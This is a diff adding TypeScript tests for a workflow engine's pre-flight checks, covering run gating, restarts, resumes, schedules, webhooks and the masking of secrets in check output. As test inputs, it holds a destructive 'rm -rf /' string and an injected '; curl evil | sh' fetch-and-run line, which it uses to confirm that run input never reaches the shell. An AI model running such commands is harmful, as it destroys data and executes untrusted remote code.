@@ -21,6 +21,7 @@ import {
   type WorkflowSchedule,
 } from "../shared/workflow.ts";
 import type { RuntimeEvent } from "./contracts.ts";
+import type { PreflightCommandRunner, PreflightEngineHealth } from "./workflow-preflight.ts";
 import { WorkflowEngine } from "./workflow-run.ts";
 import { WorkflowStore, type WorkflowInput } from "./workflow-store.ts";
 
@@ -76,6 +77,10 @@ function harness({
   let botCapabilitiesFn: (botId: string) => BotCapabilities | null = () => ({});
   /** No grants by default: a node prompt then says so. */
   let botGrantsFn: (botId: string) => string[] | null | undefined = () => undefined;
+  /** The pre-flight's command runner: every command passes with exit 0
+   * unless a test says otherwise. No engine test spawns a shell. */
+  let runCommandFn: PreflightCommandRunner = async () => ({ exitCode: 0, stdout: "", stderr: "", timedOut: false });
+  let engineHealthFn: ((botId: string) => Promise<PreflightEngineHealth>) | undefined;
   /** While set, interruptTurn stays pending until releaseInterrupts() — lets
    * tests land events in the middle of an engine `await interruptTurn`. */
   let interruptGate: Promise<void> | null = null;
@@ -117,6 +122,10 @@ function harness({
         }
       : {}),
     ...(nextOccurrence ? { nextOccurrence } : {}),
+    preflight: {
+      runCommand: (check, signal) => runCommandFn(check, signal),
+      engineHealth: (botId) => (engineHealthFn ? engineHealthFn(botId) : Promise.resolve({ ok: true, detail: "ready" })),
+    },
   });
   const base = (threadId: string) => ({
     eventId: `e${++eventSeq}`,
@@ -165,6 +174,7 @@ function harness({
         restartedInterrupts.push({ botId, threadId });
         return Promise.resolve();
       },
+      preflight: { runCommand: (check, signal) => runCommandFn(check, signal) },
     });
     return {
       engine: restartedEngine,
@@ -199,6 +209,8 @@ function harness({
     setBotState: (fn: (botId: string) => "ready" | "busy" | "missing") => (botStateFn = fn),
     setBotCapabilities: (fn: (botId: string) => BotCapabilities | null) => (botCapabilitiesFn = fn),
     setBotGrants: (fn: (botId: string) => string[] | null | undefined) => (botGrantsFn = fn),
+    setRunCommand: (fn: PreflightCommandRunner) => (runCommandFn = fn),
+    setEngineHealth: (fn: (botId: string) => Promise<PreflightEngineHealth>) => (engineHealthFn = fn),
     holdInterrupts: () => {
       interruptGate = new Promise<void>((resolve) => (releaseInterrupt = resolve));
     },
@@ -3488,5 +3500,440 @@ describe("WorkflowEngine interval schedule", () => {
     await h.engine.tick();
     expect(h.store.get(workflow.id)?.nextRunAt).toBeUndefined();
     expect(h.store.listRuns(workflow.id)).toEqual([]);
+  });
+});
+
+describe("WorkflowEngine pre-flight", () => {
+  type CommandCheck = Extract<NonNullable<WorkflowInput["preflight"]>["checks"][number], { kind: "command" }>;
+  const checked = (
+    checks: NonNullable<WorkflowInput["preflight"]>["checks"],
+    overrides: Partial<WorkflowInput> = {},
+  ): WorkflowInput => pipeline({ preflight: { checks }, ...overrides });
+  const GH: CommandCheck = { kind: "command", name: "gh auth", command: "gh auth status" };
+  const CLEAN: CommandCheck = { kind: "command", name: "clean tree", command: "git status --porcelain", expectStdoutMatch: "^$" };
+  /** A runner whose answer per check name the test controls; `stdout` and
+   * `stderr` are what the check "printed". */
+  const answering =
+    (answers: Record<string, Partial<{ exitCode: number; stdout: string; stderr: string; timedOut: boolean }>>) =>
+    async (check: CommandCheck) => ({
+      exitCode: 0,
+      stdout: "",
+      stderr: "",
+      timedOut: false,
+      ...answers[check.name],
+    });
+
+  it("a workflow with no checks dispatches its entry at once, exactly as before, with no verdict on the run", () => {
+    const h = harness();
+    const workflow = h.store.create(pipeline());
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    expect(run.status).toBe("running");
+    expect(run.preflightStartedAt).toBeUndefined();
+    expect(run.preflight).toBeUndefined();
+    expect(h.dispatches).toHaveLength(1);
+  });
+
+  it("runs the checks BEFORE the entry is dispatched, then dispatches, keeping the passing verdict on the receipt", async () => {
+    const h = harness();
+    const commands: string[] = [];
+    h.setRunCommand(async (check) => {
+      commands.push(check.command);
+      return { exitCode: 0, stdout: "Logged in to github.com as ada\nToken scopes: repo, project", stderr: "", timedOut: false };
+    });
+    const workflow = h.store.create(checked([GH, { kind: "bots-ready", name: "bots" }, { kind: "engine-health", name: "engine", botId: "planner" }]));
+    h.setNow(5_000);
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    // Returned running, parked on the entry, nothing dispatched yet.
+    expect(run).toMatchObject({ status: "running", currentNodeId: "plan", preflightStartedAt: 5_000 });
+    expect(h.dispatches).toHaveLength(0);
+    expect(h.tasks).toHaveLength(0);
+    await flush();
+    expect(commands).toEqual(["gh auth status"]);
+    const started = h.store.getRun(run.id)!;
+    expect(started.preflightStartedAt).toBeUndefined();
+    expect(started.preflight).toMatchObject({ at: 5_000, ok: true });
+    expect(started.preflight!.checks.map((check) => [check.name, check.kind, check.ok])).toEqual([
+      ["gh auth", "command", true],
+      ["bots", "bots-ready", true],
+      ["engine", "engine-health", true],
+    ]);
+    expect(started.preflight!.checks[0]!.stdout).toContain("Token scopes");
+    expect(h.dispatches).toHaveLength(1);
+    expect(h.dispatches[0]!.botId).toBe("planner");
+    expect(started.currentThreadId).toBe("thread-1");
+    expect(h.reload().getRun(run.id)?.preflight?.ok).toBe(true);
+  });
+
+  it("a failing check fails the run at the entry with the check named, output kept and masked, and notifies — no bot turn", async () => {
+    const h = harness();
+    h.setRunCommand(
+      answering({
+        "gh auth": { exitCode: 1, stderr: `You are not logged in. token was ${SECRET} and Bearer abcdefghijklmnop` },
+      }),
+    );
+    const workflow = h.store.create(checked([GH, CLEAN]));
+    h.setNow(5_000);
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    await flush();
+    const failed = h.store.getRun(run.id)!;
+    expect(failed).toMatchObject({ status: "failed", currentNodeId: "plan", endedAt: 5_000 });
+    expect(failed.error).toBe('pre-flight check "gh auth" failed: exited with code 1 (expected 0)');
+    expect(failed.preflightStartedAt).toBeUndefined();
+    expect(failed.preflight!.ok).toBe(false);
+    expect(failed.preflight!.checks.map((check) => [check.name, check.ok])).toEqual([
+      ["gh auth", false],
+      ["clean tree", true],
+    ]);
+    const leaked = JSON.stringify(failed.preflight);
+    expect(leaked).not.toContain(SECRET);
+    expect(leaked).not.toContain("abcdefghijklmnop");
+    expect(leaked).toContain("You are not logged in");
+    expect(h.dispatches).toHaveLength(0);
+    expect(h.tasks).toHaveLength(0);
+    expect(h.notifications).toEqual([
+      {
+        runId: run.id,
+        kind: "failed",
+        message: `Workflow "Release" run failed at node "plan": pre-flight check "gh auth" failed: exited with code 1 (expected 0)`,
+      },
+    ]);
+  });
+
+  it("a dirty working tree fails the ^$ stdout check, and the receipt says so", async () => {
+    const h = harness();
+    h.setRunCommand(answering({ "clean tree": { stdout: " M server/index.ts\n" } }));
+    const workflow = h.store.create(checked([CLEAN]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    await flush();
+    expect(h.store.getRun(run.id)).toMatchObject({
+      status: "failed",
+      error: 'pre-flight check "clean tree" failed: exited with code 0 but stdout did not match /^$/',
+    });
+    expect(h.store.getRun(run.id)!.preflight!.checks[0]!.stdout).toBe("M server/index.ts");
+  });
+
+  it("a busy or missing bot refuses the start through bots-ready, before any dispatch would have parked the run", async () => {
+    const h = harness();
+    h.setBotState((botId) => (botId === "shipper" ? "busy" : "ready"));
+    const workflow = h.store.create(checked([{ kind: "bots-ready", name: "bots" }]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    await flush();
+    expect(h.store.getRun(run.id)).toMatchObject({
+      status: "failed",
+      error: 'pre-flight check "bots" failed: bot "shipper" is busy',
+    });
+    expect(h.dispatches).toHaveLength(0);
+  });
+
+  it("engine-health relays the driver's verdict", async () => {
+    const h = harness();
+    h.setEngineHealth(async () => ({ ok: false, detail: 'engine "codex" is not signed in' }));
+    const workflow = h.store.create(checked([{ kind: "engine-health", name: "codex", botId: "planner" }]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    await flush();
+    expect(h.store.getRun(run.id)).toMatchObject({
+      status: "failed",
+      error: 'pre-flight check "codex" failed: engine "codex" is not signed in',
+    });
+  });
+
+  it("a run in pre-flight is not stranded, not timed out, and not dispatched twice by the tick", async () => {
+    const h = harness();
+    let release: (() => void) | null = null;
+    h.setRunCommand(
+      () =>
+        new Promise((resolve) => {
+          release = () => resolve({ exitCode: 0, stdout: "", stderr: "", timedOut: false });
+        }),
+    );
+    const workflow = h.store.create(checked([GH]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    // Ticks while the checks run: nothing to recover, nothing to time out.
+    h.setNow(5_000 + 3 * HOUR);
+    await h.engine.tick();
+    await h.engine.tick();
+    expect(h.store.getRun(run.id)).toMatchObject({ status: "running", preflightStartedAt: 1_000 });
+    expect(h.dispatches).toHaveLength(0);
+    release!();
+    await flush();
+    expect(h.store.getRun(run.id)?.preflight?.ok).toBe(true);
+    expect(h.dispatches).toHaveLength(1);
+    await h.engine.tick();
+    expect(h.dispatches).toHaveLength(1);
+  });
+
+  it("a restart during the pre-flight re-runs the checks rather than dispatching the guarded node on no verdict", async () => {
+    const h = harness();
+    // The first process's checks never answer — it "died" mid-check.
+    h.setRunCommand(() => new Promise(() => {}));
+    const workflow = h.store.create(checked([GH]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    expect(h.store.getRun(run.id)?.preflightStartedAt).toBe(1_000);
+
+    h.setRunCommand(answering({}));
+    const restarted = h.reloadEngine();
+    h.setNow(2_000);
+    await restarted.engine.tick();
+    // Re-marked by the restarted engine, then passed and dispatched by it.
+    await flush();
+    const recovered = restarted.store.getRun(run.id)!;
+    expect(recovered.preflight).toMatchObject({ at: 2_000, ok: true });
+    expect(recovered.preflightStartedAt).toBeUndefined();
+    expect(restarted.dispatches).toHaveLength(1);
+    expect(recovered.currentThreadId).toBe("re-thread-1");
+    // The dead process's verdict, if it ever arrived, would find no token here.
+    expect(h.dispatches).toHaveLength(0);
+  });
+
+  it("a restart during the pre-flight of a resumed run re-runs the checks at the node it resumed on", async () => {
+    const h = harness();
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1 } }));
+    const workflow = h.store.create(checked([GH]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    await flush();
+    expect(h.store.getRun(run.id)?.status).toBe("failed");
+    h.setRunCommand(() => new Promise(() => {}));
+    h.engine.resumeRun(run.id);
+    expect(h.store.getRun(run.id)).toMatchObject({ status: "running", currentNodeId: "plan", preflightStartedAt: 1_000 });
+    h.setRunCommand(answering({}));
+    const restarted = h.reloadEngine();
+    await restarted.engine.tick();
+    await flush();
+    expect(restarted.store.getRun(run.id)?.preflight?.ok).toBe(true);
+    expect(restarted.dispatches.map((dispatch) => dispatch.botId)).toEqual(["planner"]);
+  });
+
+  it("cancelling a run mid-pre-flight drops the late verdict: nothing is dispatched, the run stays cancelled", async () => {
+    const h = harness();
+    let release: (() => void) | null = null;
+    h.setRunCommand(
+      () =>
+        new Promise((resolve) => {
+          release = () => resolve({ exitCode: 0, stdout: "", stderr: "", timedOut: false });
+        }),
+    );
+    const workflow = h.store.create(checked([GH]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    const cancelled = await h.engine.cancelRun(run.id);
+    expect(cancelled).toMatchObject({ status: "cancelled" });
+    expect(cancelled.preflightStartedAt).toBeUndefined();
+    release!();
+    await flush();
+    expect(h.store.getRun(run.id)).toMatchObject({ status: "cancelled" });
+    expect(h.store.getRun(run.id)?.preflight).toBeUndefined();
+    expect(h.dispatches).toHaveLength(0);
+    // Nothing is stranded either: the queue is empty and the tick is quiet.
+    await h.engine.tick();
+    expect(h.dispatches).toHaveLength(0);
+  });
+
+  it("resume runs the checks again with a fresh verdict, and refuses again while the environment is still wrong", async () => {
+    const h = harness();
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1, stderr: "not logged in" } }));
+    const workflow = h.store.create(checked([GH]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    await flush();
+    expect(h.store.getRun(run.id)?.status).toBe("failed");
+
+    h.setNow(9_000);
+    const resumed = h.engine.resumeRun(run.id);
+    // The old verdict is gone with the old failure; the new flight is marked.
+    expect(resumed).toMatchObject({ status: "running", preflightStartedAt: 9_000 });
+    expect(resumed.preflight).toBeUndefined();
+    expect(resumed.error).toBeUndefined();
+    await flush();
+    expect(h.store.getRun(run.id)).toMatchObject({ status: "failed", currentNodeId: "plan" });
+    expect(h.store.getRun(run.id)?.preflight).toMatchObject({ at: 9_000, ok: false });
+    expect(h.notifications).toHaveLength(2);
+
+    // Fixed: the resume passes and the entry is dispatched.
+    h.setRunCommand(answering({}));
+    h.engine.resumeRun(run.id);
+    await flush();
+    expect(h.store.getRun(run.id)?.preflight?.ok).toBe(true);
+    expect(h.dispatches).toHaveLength(1);
+  });
+
+  it("a resume at a later node runs the checks before THAT node, and dispatches it on a pass", async () => {
+    const h = harness();
+    h.setRunCommand(answering({}));
+    const workflow = h.store.create(checked([GH]));
+    const run = h.engine.startRun(workflow.id, "go", "manual");
+    await flush();
+    h.completeTurn("thread-1", envelope("done"));
+    // ship is dispatched; make it fail terminally (no retries, missing bot).
+    h.setBotState((botId) => (botId === "shipper" ? "missing" : "ready"));
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1 } }));
+    // Re-drive via resume after a terminal failure at ship.
+    const current = h.store.getRun(run.id)!;
+    expect(current.currentNodeId).toBe("ship");
+    expect(current.status).toBe("running");
+    // Fail it: a timeout at ship exhausts nothing here, so force through the harness.
+    h.dispatches[1]!.onDispatchError("boom");
+    h.setNow(1_000 + 10 * HOUR);
+    await h.engine.tick(); // retry due -> shipper missing -> terminal
+    expect(h.store.getRun(run.id)?.status).toBe("failed");
+
+    h.setBotState(() => "ready");
+    h.engine.resumeRun(run.id);
+    await flush();
+    // The pre-flight refused the resume at ship; nothing was dispatched.
+    expect(h.store.getRun(run.id)).toMatchObject({ status: "failed", currentNodeId: "ship" });
+    expect(h.store.getRun(run.id)?.error).toContain('pre-flight check "gh auth" failed');
+    expect(h.dispatches).toHaveLength(2);
+
+    h.setRunCommand(answering({}));
+    h.engine.resumeRun(run.id);
+    await flush();
+    expect(h.dispatches).toHaveLength(3);
+    expect(h.dispatches[2]!.botId).toBe("shipper");
+    expect(h.store.getRun(run.id)?.nodeResults.map((result) => result.nodeId)).toEqual(["plan"]);
+  });
+
+  it("a queued run's checks run at PROMOTION, against the environment then, not at creation", async () => {
+    const h = harness();
+    const runs: string[] = [];
+    h.setRunCommand(async () => {
+      runs.push("checked");
+      return { exitCode: 0, stdout: "", stderr: "", timedOut: false };
+    });
+    const workflow = h.store.create(checked([GH]));
+    const first = h.engine.startRun(workflow.id, "one", "manual");
+    await flush();
+    expect(runs).toEqual(["checked"]);
+    const second = h.engine.startRun(workflow.id, "two", "manual");
+    expect(second.status).toBe("queued");
+    expect(second.preflightStartedAt).toBeUndefined();
+    await flush();
+    expect(runs).toEqual(["checked"]);
+
+    // The environment breaks while the second waits; the first finishes.
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1 } }));
+    h.completeTurn("thread-1", envelope("done"));
+    h.completeTurn("thread-2", envelope("shipped"));
+    expect(h.store.getRun(first.id)?.status).toBe("completed");
+    expect(h.store.getRun(second.id)).toMatchObject({ status: "running", preflightStartedAt: 1_000, currentNodeId: "plan" });
+    await flush();
+    expect(h.store.getRun(second.id)).toMatchObject({ status: "failed", currentNodeId: "plan" });
+    expect(h.store.getRun(second.id)?.error).toContain('pre-flight check "gh auth" failed');
+    expect(h.dispatches).toHaveLength(2);
+  });
+
+  it("a scheduled slot refused by the pre-flight leaves a failed receipt stamped with the trigger, notifies, and the next slot still fires", async () => {
+    const slots = [10_000, 20_000];
+    const h = harness({ nextOccurrence: (_schedule, after) => slots.find((slot) => slot > after) ?? null });
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1, stderr: "token has read:project only" } }));
+    const workflow = h.store.create(
+      checked([GH], { triggers: { schedule: { type: "daily", time: "09:00", weekdays: [1, 2, 3, 4, 5] } } }),
+    );
+    h.setNow(9_000);
+    await h.engine.tick(); // arms 10_000
+    h.setNow(10_000);
+    await h.engine.tick(); // fires
+    await flush();
+    const runs = h.store.listRuns(workflow.id);
+    expect(runs).toHaveLength(1);
+    expect(runs[0]).toMatchObject({ trigger: "schedule", status: "failed", currentNodeId: "plan" });
+    expect(runs[0]!.error).toBe('pre-flight check "gh auth" failed: exited with code 1 (expected 0)');
+    expect(runs[0]!.preflight!.checks[0]!.stderr).toBe("token has read:project only");
+    expect(h.notifications).toHaveLength(1);
+    expect(h.notifications[0]!.message).toContain('pre-flight check "gh auth" failed');
+    // The slot was advanced before the start, as always.
+    expect(h.store.get(workflow.id)?.nextRunAt).toBe(20_000);
+
+    h.setRunCommand(answering({}));
+    h.setNow(20_000);
+    await h.engine.tick();
+    await flush();
+    expect(h.store.listRuns(workflow.id).map((run) => run.status)).toEqual(["running", "failed"]);
+    expect(h.dispatches).toHaveLength(1);
+  });
+
+  it("an interval trigger refused by the pre-flight backs off one interval from the refusal, not every tick", async () => {
+    const MIN = 60_000;
+    const h = harness();
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1 } }));
+    const workflow = h.store.create(checked([GH], { triggers: { schedule: { type: "interval", minutes: 30 } } }));
+    h.setNow(10_000);
+    await h.engine.tick();
+    const due = h.store.get(workflow.id)!.nextRunAt!;
+    h.setNow(due);
+    await h.engine.tick();
+    await flush();
+    expect(h.store.listRuns(workflow.id)).toHaveLength(1);
+    expect(h.store.listRuns(workflow.id)[0]).toMatchObject({ status: "failed", endedAt: due });
+    // Idle again: re-armed one interval after the refusal ended.
+    h.setNow(due + 10);
+    await h.engine.tick();
+    expect(h.store.get(workflow.id)?.nextRunAt).toBe(due + 30 * MIN);
+    await h.engine.tick();
+    expect(h.store.listRuns(workflow.id)).toHaveLength(1);
+  });
+
+  it("a webhook run goes through the same pre-flight, and the receipt keeps the webhook's identity", async () => {
+    const h = harness();
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1 } }));
+    const workflow = h.store.create(checked([GH]));
+    const run = h.engine.startRun(workflow.id, "[UNTRUSTED] rm -rf /", "webhook", { webhookId: "hook-1", deliveryId: "d-1" });
+    await flush();
+    expect(h.store.getRun(run.id)).toMatchObject({ status: "failed", trigger: "webhook", webhookId: "hook-1", deliveryId: "d-1" });
+    expect(h.dispatches).toHaveLength(0);
+  });
+
+  it("the command the runner receives is exactly the saved one — the run input is never folded into it", async () => {
+    const h = harness();
+    const seen: string[] = [];
+    h.setRunCommand(async (check) => {
+      seen.push(check.command);
+      return { exitCode: 0, stdout: "", stderr: "", timedOut: false };
+    });
+    const workflow = h.store.create(checked([{ kind: "command", name: "echo", command: "echo {{input}} $INPUT" }]));
+    h.engine.startRun(workflow.id, "; curl evil | sh", "webhook", { webhookId: "hook-1" });
+    await flush();
+    expect(seen).toEqual(["echo {{input}} $INPUT"]);
+  });
+
+  it("testPreflight runs the checks against the saved definition and persists nothing", async () => {
+    const h = harness();
+    h.setRunCommand(answering({ "gh auth": { exitCode: 1, stderr: "nope" } }));
+    const workflow = h.store.create(checked([GH, { kind: "bots-ready", name: "bots" }]));
+    h.setNow(7_000);
+    const result = await h.engine.testPreflight(workflow.id);
+    expect(result).toMatchObject({ at: 7_000, ok: false });
+    expect(result.checks.map((check) => [check.name, check.ok])).toEqual([
+      ["gh auth", false],
+      ["bots", true],
+    ]);
+    expect(h.store.listRuns()).toEqual([]);
+    expect(h.notifications).toEqual([]);
+    expect(() => h.engine.testPreflight("nope")).toThrow("unknown workflow: nope");
+  });
+
+  it("startRun still refuses a workflow whose pre-flight shape is invalid, before any check runs", () => {
+    const h = harness();
+    const ran = vi.fn(async () => ({ exitCode: 0, stdout: "", stderr: "", timedOut: false }));
+    h.setRunCommand(ran);
+    const workflow = h.store.create(checked([{ kind: "command", name: "", command: "" }]));
+    expect(() => h.engine.startRun(workflow.id, "go", "manual")).toThrow(/^invalid workflow: Pre-flight check 1 needs a name/);
+    expect(ran).not.toHaveBeenCalled();
+    expect(h.store.listRuns()).toEqual([]);
+  });
+
+  it("a receipt written before pre-flights existed loads and is re-driven as before", async () => {
+    const h = harness();
+    const workflow = h.store.create(pipeline());
+    // A stranded running run with no marker and no thread: the classic orphan.
+    const run = h.store.createRun({
+      workflowId: workflow.id,
+      status: "running",
+      trigger: "manual",
+      attempt: 0,
+      input: "old",
+      nodeResults: [],
+      startedAt: 500,
+    });
+    await h.engine.tick();
+    expect(h.dispatches).toHaveLength(1);
+    expect(h.store.getRun(run.id)?.preflight).toBeUndefined();
   });
 });
